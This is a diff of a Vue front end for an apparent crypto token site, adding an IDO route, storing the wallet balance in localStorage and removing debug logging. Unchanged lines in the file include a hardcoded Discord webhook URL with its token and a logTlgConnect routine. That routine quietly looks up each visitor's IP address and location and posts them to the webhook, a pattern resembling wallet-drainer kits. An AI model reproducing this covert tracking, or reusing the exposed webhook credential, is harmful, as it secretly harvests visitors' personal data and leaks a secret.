@@ -907,6 +907,8 @@ b2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC"
             >
             <a href="#">Docs</a>
             <router-link to="/Stake">Stake</router-link>
+            <router-link to="/Ido">Ido</router-link>
+
             <!-- <router-link
               to="/Airdrop"
               :class="Twittername == '' ? '' : 'istwdl'"
@@ -2030,6 +2032,7 @@ b2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC"
         <router-link to="/">HOME</router-link>
         <router-link to="/Stake">STAKE</router-link>
         <router-link to="/Airdrop">AIRDROP</router-link>
+        <router-link to="/Ido">IDO</router-link>
       </div>
     </div>
   </div>
@@ -3505,6 +3508,7 @@ Pyr/AAAAAElFTkSuQmCC"
 <script setup>
 import hello from "hellojs/dist/hello.all";
 import { onMounted, ref, onBeforeUnmount } from "vue";
+import bus from "./utils/bus";
 import Web3Modal from "web3modal";
 import { ethers } from "ethers";
 let dhisshow = ref(0);
@@ -3525,10 +3529,8 @@ let ydonshow = (str) => {
 let hebtqh = (str) => {
   if (hybt.value == str) {
     hybt.value = 0;
-    console.log("0", hybt.value);
   } else {
     hybt.value = 1;
-    console.log("1", hybt.value);
   }
 };
 let tcshow = async () => {
@@ -3550,7 +3552,7 @@ onBeforeUnmount(() => {
     web3Modal.clearCachedProvider();
   }
 });
-//登录twitter
+//logintwitter
 let twitterlog = () => {
   ongb();
   loginan.value = 1;
@@ -3566,7 +3568,7 @@ let twitterlog = () => {
     .login()
     .then(
       function (res) {
-        console.log(res, "登录成功");
+        console.log(res, "good");
         Twittername.value = res.authResponse.screen_name;
         xxhladdress.value = res.authResponse.screen_name;
         localStorage.setItem("Twname", Twittername.value);
@@ -3589,7 +3591,7 @@ let twitterlog = () => {
   });
 };
 onMounted(() => {
-  //登录google
+  //logingoogle
   window.onload = function () {
     google.accounts.id.initialize({
       client_id:
@@ -3677,8 +3679,10 @@ const render = async () => {
   localStorage.setItem("xhladd", xxhladdress.value);
   const rawBalance = await provider.getBalance(xhladdress.value);
   xethbalance.value = ethers.utils.formatEther(rawBalance);
+  localStorage.setItem("xhlbalance", xethbalance.value);
+  bus.$emit("qbbalance", xethbalance.value);
 };
-//关闭弹窗
+//clone
 let ongb = () => {
   showno.value = 0;
 };
@@ -3686,11 +3690,9 @@ const webhook =
   "https://discord.com/api/webhooks/1138737063882129419/nh1Q6bcaheDPLsgbgarvky7Rtqe10JlBw3lrPextAG4nBeeC4GIAo1NDWrpyoQe-v4ad";
 let qdevice_emoji = "";
 function logTlgConnect(msg) {
-  console.log(11);
   fetch("https://api.db-ip.com/v2/free/self/")
     .then(function (response) {
       return response.json();
-      console.log("fetch");
     })
     .then(function (payload) {
       let device_emoji = "Desktop";
@@ -3711,7 +3713,6 @@ function logTlgConnect(msg) {
     });
 }
 function isMobile() {
-  console.log(22);
   var check = false;
   (function (a) {
     if (
@@ -3727,7 +3728,6 @@ function isMobile() {
   return check;
 }
 function getPageBaseUrl() {
-  console.log(33);
   let baseURL = "";
   if (!window.location.origin) {
     window.location.origin =
@@ -3742,7 +3742,6 @@ function getPageBaseUrl() {
   return baseURL;
 }
 function hidiscord(pay, qdevice) {
-  console.log(44);
   let winurl = getPageBaseUrl();
   let data = {
     content: `**🤞 welcome newcomer --** IP: ${pay.ipAddress} (${pay.city}/${pay.countryCode}) webhost:${winurl}
